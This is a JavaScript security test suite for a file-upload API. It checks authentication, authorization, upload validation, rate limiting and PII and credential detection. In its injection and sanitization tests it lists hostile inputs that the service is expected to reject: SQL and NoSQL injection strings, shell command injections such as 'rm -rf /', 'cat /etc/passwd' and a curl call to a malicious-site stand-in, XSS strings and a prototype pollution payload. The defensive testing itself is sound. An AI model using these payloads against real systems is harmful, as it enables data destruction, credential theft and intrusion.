const request = require('supertest');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const app = require('../services/server/index');
const knex = require('../services/server/db/knex');

describe('Security Audit and Penetration Tests', () => {
  let testUser;
  let authToken;
  let maliciousUser;
  let maliciousToken;

  beforeAll(async () => {
    // Setup test database
    await knex.migrate.latest();
    await knex.seed.run();

    // Create legitimate test user
    const userResponse = await request(app)
      .post('/api/auth/register')
      .send({
        username: 'securitytestuser',
        email: 'security@example.com',
        password: 'testpassword123'
      });

    testUser = userResponse.body.user;

    const loginResponse = await request(app)
      .post('/api/auth/login')
      .send({
        email: 'security@example.com',
        password: 'testpassword123'
      });

    authToken = loginResponse.body.token;

    // Create malicious user for attack simulation
    const maliciousUserResponse = await request(app)
      .post('/api/auth/register')
      .send({
        username: 'malicioususer',
        email: 'malicious@example.com',
        password: 'maliciouspassword123'
      });

    maliciousUser = maliciousUserResponse.body.user;

    const maliciousLoginResponse = await request(app)
      .post('/api/auth/login')
      .send({
        email: 'malicious@example.com',
        password: 'maliciouspassword123'
      });

    maliciousToken = maliciousLoginResponse.body.token;
  });

  afterAll(async () => {
    await knex.destroy();
  });

  beforeEach(async () => {
    // Clean up artifacts between tests
    await knex('artifacts').del();
    await knex('processing_jobs').del();
  });

  describe('Authentication and Authorization Attacks', () => {
    test('should reject requests without authentication token', async () => {
      const response = await request(app)
        .post('/api/upload/presigned')
        .send({
          filename: 'test.txt',
          contentType: 'text/plain',
          fileSize: 1024
        });

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('Authentication required');
    });

    test('should reject requests with invalid JWT token', async () => {
      const response = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', 'Bearer invalid-token-here')
        .send({
          filename: 'test.txt',
          contentType: 'text/plain',
          fileSize: 1024
        });

      expect(response.status).toBe(401);
      expect(response.body.error).toContain('Invalid token');
    });

    test('should reject requests with expired JWT token', async () => {
      // Create an expired token (this would need to be implemented in your JWT service)
      const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';

      const response = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${expiredToken}`)
        .send({
          filename: 'test.txt',
          contentType: 'text/plain',
          fileSize: 1024
        });

      expect(response.status).toBe(401);
    });

    test('should prevent access to other users artifacts', async () => {
      // Create artifact as first user
      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'private-document.txt',
          contentType: 'text/plain',
          fileSize: 1024
        });

      const artifactId = presignedResponse.body.artifactId;

      // Try to access as malicious user
      const accessResponse = await request(app)
        .get(`/api/artifacts/${artifactId}`)
        .set('Authorization', `Bearer ${maliciousToken}`);

      expect(accessResponse.status).toBe(403);
      expect(accessResponse.body.error).toContain('Access denied');
    });
  });

  describe('File Upload Security Attacks', () => {
    test('should reject malicious file types', async () => {
      const maliciousFileTypes = [
        'application/x-executable',
        'application/x-msdownload',
        'application/x-msdos-program',
        'application/x-winexe',
        'text/x-shellscript',
        'application/javascript'
      ];

      for (const contentType of maliciousFileTypes) {
        const response = await request(app)
          .post('/api/upload/presigned')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            filename: 'malicious.exe',
            contentType: contentType,
            fileSize: 1024
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('File type not allowed');
      }
    });

    test('should reject files with malicious extensions despite valid MIME type', async () => {
      const maliciousFilenames = [
        'document.pdf.exe',
        'image.jpg.bat',
        'text.txt.scr',
        'data.json.com',
        '../../../etc/passwd',
        'file with spaces.exe',
        'normal.txt\x00.exe'
      ];

      for (const filename of maliciousFilenames) {
        const response = await request(app)
          .post('/api/upload/presigned')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            filename: filename,
            contentType: 'text/plain',
            fileSize: 1024
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toMatch(/Invalid filename|File type not allowed/);
      }
    });

    test('should enforce file size limits', async () => {
      const oversizedFile = 2 * 1024 * 1024 * 1024; // 2GB

      const response = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'huge-file.txt',
          contentType: 'text/plain',
          fileSize: oversizedFile
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('File size exceeds limit');
    });

    test('should detect and reject zip bombs', async () => {
      // Simulate a zip bomb (highly compressed malicious archive)
      const response = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'suspicious.zip',
          contentType: 'application/zip',
          fileSize: 1024, // Small file size but would expand to huge size
          metadata: {
            compressionRatio: 10000 // Suspicious compression ratio
          }
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Suspicious file detected');
    });

    test('should validate image file headers', async () => {
      // Test with fake image (text file with image extension)
      const response = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'fake-image.jpg',
          contentType: 'image/jpeg',
          fileSize: 1024,
          metadata: {
            actualMimeType: 'text/plain' // Simulating MIME type mismatch
          }
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('File content does not match declared type');
    });
  });

  describe('Image Processing Security Attacks', () => {
    test('should detect steganography in images', async () => {
      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'suspicious-image.jpg',
          contentType: 'image/jpeg',
          fileSize: 50000
        });

      const artifactId = presignedResponse.body.artifactId;

      // Simulate confirmation with steganography detection
      const confirmResponse = await request(app)
        .post(`/api/upload/confirm/${artifactId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          s3Key: 'images/suspicious-image.jpg',
          etag: 'test-etag',
          securityScanResults: {
            steganographyDetected: true,
            hiddenDataSize: 10240,
            suspiciousPatterns: ['embedded_executable', 'encrypted_data']
          }
        });

      expect(confirmResponse.status).toBe(400);
      expect(confirmResponse.body.error).toContain('Security threat detected');
    });

    test('should detect malicious EXIF data', async () => {
      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'malicious-exif.jpg',
          contentType: 'image/jpeg',
          fileSize: 25000
        });

      const artifactId = presignedResponse.body.artifactId;

      const confirmResponse = await request(app)
        .post(`/api/upload/confirm/${artifactId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          s3Key: 'images/malicious-exif.jpg',
          etag: 'test-etag',
          metadata: {
            exifData: {
              maliciousScript: '<script>alert("xss")</script>',
              oversizedComment: 'A'.repeat(100000), // Extremely large comment
              suspiciousGPS: { lat: 0, lon: 0 } // Null island coordinates
            }
          }
        });

      expect(confirmResponse.status).toBe(400);
      expect(confirmResponse.body.error).toContain('Malicious EXIF data detected');
    });

    test('should prevent image processing buffer overflows', async () => {
      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'overflow-test.png',
          contentType: 'image/png',
          fileSize: 100000
        });

      const artifactId = presignedResponse.body.artifactId;

      const confirmResponse = await request(app)
        .post(`/api/upload/confirm/${artifactId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          s3Key: 'images/overflow-test.png',
          etag: 'test-etag',
          metadata: {
            width: 2147483647, // Max int32 value
            height: 2147483647,
            channels: 4
          }
        });

      expect(confirmResponse.status).toBe(400);
      expect(confirmResponse.body.error).toContain('Invalid image dimensions');
    });
  });

  describe('Injection Attacks', () => {
    test('should prevent SQL injection in filename', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE artifacts; --",
        "' OR '1'='1",
        "'; INSERT INTO artifacts (filename) VALUES ('hacked'); --",
        "' UNION SELECT * FROM users --"
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/upload/presigned')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            filename: payload,
            contentType: 'text/plain',
            fileSize: 1024
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid filename');
      }
    });

    test('should prevent NoSQL injection in search parameters', async () => {
      const noSQLInjectionPayloads = [
        { $ne: null },
        { $gt: '' },
        { $regex: '.*' },
        { $where: 'function() { return true; }' }
      ];

      for (const payload of noSQLInjectionPayloads) {
        const response = await request(app)
          .get('/api/artifacts')
          .set('Authorization', `Bearer ${authToken}`)
          .query({ search: JSON.stringify(payload) });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('Invalid search parameter');
      }
    });

    test('should prevent command injection in processing parameters', async () => {
      const commandInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& curl malicious-site.com',
        '`whoami`',
        '$(id)'
      ];

      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'test.txt',
          contentType: 'text/plain',
          fileSize: 1024
        });

      const artifactId = presignedResponse.body.artifactId;

      for (const payload of commandInjectionPayloads) {
        const confirmResponse = await request(app)
          .post(`/api/upload/confirm/${artifactId}`)
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            s3Key: 'test.txt',
            etag: 'test-etag',
            processingOptions: {
              customCommand: payload
            }
          });

        expect(confirmResponse.status).toBe(400);
        expect(confirmResponse.body.error).toContain('Invalid processing option');
      }
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    test('should enforce rate limits on upload requests', async () => {
      const requests = [];
      const maxRequests = 105; // Exceed the limit of 100 per 15 minutes

      // Fire multiple requests rapidly
      for (let i = 0; i < maxRequests; i++) {
        const request_promise = request(app)
          .post('/api/upload/presigned')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            filename: `rate-limit-test-${i}.txt`,
            contentType: 'text/plain',
            fileSize: 1024
          });

        requests.push(request_promise);
      }

      const responses = await Promise.all(requests);
      const rateLimitedResponses = responses.filter(r => r.status === 429);

      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      expect(rateLimitedResponses[0].body.error).toContain('Rate limit exceeded');
    }, 30000);

    test('should prevent resource exhaustion through large batch uploads', async () => {
      const largeFileList = Array.from({ length: 1000 }, (_, i) => ({
        filename: `batch-dos-${i}.txt`,
        contentType: 'text/plain',
        fileSize: 1024 * 1024 // 1MB each
      }));

      const response = await request(app)
        .post('/api/upload/batch')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          files: largeFileList
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('Batch size exceeds limit');
    });

    test('should prevent memory exhaustion through concurrent processing', async () => {
      const concurrentUploads = Array.from({ length: 50 }, (_, i) => {
        return request(app)
          .post('/api/upload/presigned')
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            filename: `concurrent-${i}.jpg`,
            contentType: 'image/jpeg',
            fileSize: 10 * 1024 * 1024 // 10MB images
          });
      });

      const responses = await Promise.all(concurrentUploads);
      const successfulUploads = responses.filter(r => r.status === 200);
      const rejectedUploads = responses.filter(r => r.status === 503);

      // System should reject some uploads to prevent overload
      expect(rejectedUploads.length).toBeGreaterThan(0);
      expect(rejectedUploads[0].body.error).toContain('Service temporarily unavailable');
    });
  });

  describe('Data Validation and Sanitization', () => {
    test('should sanitize user input in artifact metadata', async () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '"><script>alert("xss")</script>'
      ];

      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'xss-test.txt',
          contentType: 'text/plain',
          fileSize: 1024
        });

      const artifactId = presignedResponse.body.artifactId;

      for (const payload of xssPayloads) {
        const confirmResponse = await request(app)
          .post(`/api/upload/confirm/${artifactId}`)
          .set('Authorization', `Bearer ${authToken}`)
          .send({
            s3Key: 'xss-test.txt',
            etag: 'test-etag',
            metadata: {
              description: payload,
              tags: [payload]
            }
          });

        // Should either reject or sanitize the input
        if (confirmResponse.status === 200) {
          // If accepted, verify it was sanitized
          const artifact = await request(app)
            .get(`/api/artifacts/${artifactId}`)
            .set('Authorization', `Bearer ${authToken}`);

          expect(artifact.body.metadata.description).not.toContain('<script>');
          expect(artifact.body.metadata.description).not.toContain('javascript:');
        } else {
          expect(confirmResponse.status).toBe(400);
          expect(confirmResponse.body.error).toContain('Invalid metadata');
        }
      }
    });

    test('should validate JSON payloads for malformed data', async () => {
      const malformedPayloads = [
        '{"key": "value"', // Missing closing brace
        '{"key": undefined}', // Invalid JSON
        '{"key": NaN}', // Invalid JSON
        '{"key": Infinity}', // Invalid JSON
        '{"__proto__": {"isAdmin": true}}' // Prototype pollution attempt
      ];

      for (const payload of malformedPayloads) {
        const response = await request(app)
          .post('/api/upload/presigned')
          .set('Authorization', `Bearer ${authToken}`)
          .set('Content-Type', 'application/json')
          .send(payload);

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Sensitive Data Detection', () => {
    test('should detect and flag PII in uploaded content', async () => {
      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'pii-document.txt',
          contentType: 'text/plain',
          fileSize: 2048
        });

      const artifactId = presignedResponse.body.artifactId;

      const confirmResponse = await request(app)
        .post(`/api/upload/confirm/${artifactId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          s3Key: 'pii-document.txt',
          etag: 'test-etag',
          contentPreview: 'John Doe, SSN: 123-45-6789, Email: john@example.com, Phone: (555) 123-4567'
        });

      expect(confirmResponse.status).toBe(200);

      // Check that PII was detected and flagged
      const artifact = await request(app)
        .get(`/api/artifacts/${artifactId}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(artifact.body.sensitiveDataFlags.hasPII).toBe(true);
      expect(artifact.body.sensitiveDataFlags.detectedTypes).toContain('ssn');
      expect(artifact.body.sensitiveDataFlags.detectedTypes).toContain('email');
      expect(artifact.body.sensitiveDataFlags.detectedTypes).toContain('phone');
    });

    test('should detect credentials and API keys', async () => {
      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'config-file.json',
          contentType: 'application/json',
          fileSize: 1024
        });

      const artifactId = presignedResponse.body.artifactId;

      const confirmResponse = await request(app)
        .post(`/api/upload/confirm/${artifactId}`)
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          s3Key: 'config-file.json',
          etag: 'test-etag',
          contentPreview: JSON.stringify({
            aws_access_key_id: 'AKIAIOSFODNN7EXAMPLE',
            aws_secret_access_key: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
            api_key: 'sk-1234567890abcdef',
            password: 'super_secret_password'
          })
        });

      expect(confirmResponse.status).toBe(200);

      const artifact = await request(app)
        .get(`/api/artifacts/${artifactId}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect(artifact.body.sensitiveDataFlags.hasCredentials).toBe(true);
      expect(artifact.body.sensitiveDataFlags.hasAPIKeys).toBe(true);
    });
  });

  describe('Access Control and Authorization', () => {
    test('should prevent horizontal privilege escalation', async () => {
      // Create artifact as user 1
      const presignedResponse = await request(app)
        .post('/api/upload/presigned')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          filename: 'private-doc.txt',
          contentType: 'text/plain',
          fileSize: 1024
        });

      const artifactId = presignedResponse.body.artifactId;

      // Try to modify artifact as user 2
      const maliciousUpdate = await request(app)
        .put(`/api/artifacts/${artifactId}`)
        .set('Authorization', `Bearer ${maliciousToken}`)
        .send({
          filename: 'hacked-doc.txt',
          status: 'completed'
        });

      expect(maliciousUpdate.status).toBe(403);

      // Try to delete artifact as user 2
      const maliciousDelete = await request(app)
        .delete(`/api/artifacts/${artifactId}`)
        .set('Authorization', `Bearer ${maliciousToken}`);

      expect(maliciousDelete.status).toBe(403);
    });

    test('should prevent vertical privilege escalation', async () => {
      // Try to access admin endpoints as regular user
      const adminEndpoints = [
        '/api/admin/users',
        '/api/admin/artifacts',
        '/api/admin/system-stats',
        '/api/admin/security-logs'
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app)
          .get(endpoint)
          .set('Authorization', `Bearer ${authToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toContain('Insufficient privileges');
      }
    });
  });

  describe('Security Headers and HTTPS', () => {
    test('should include security headers in responses', async () => {
      const response = await request(app)
        .get('/api/health')
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['content-security-policy']).toBeDefined();
    });

    test('should prevent clickjacking attacks', async () => {
      const response = await request(app)
        .get('/api/artifacts')
        .set('Authorization', `Bearer ${authToken}`);

      expect(response.headers['x-frame-options']).toBe('DENY');
    });
  });
});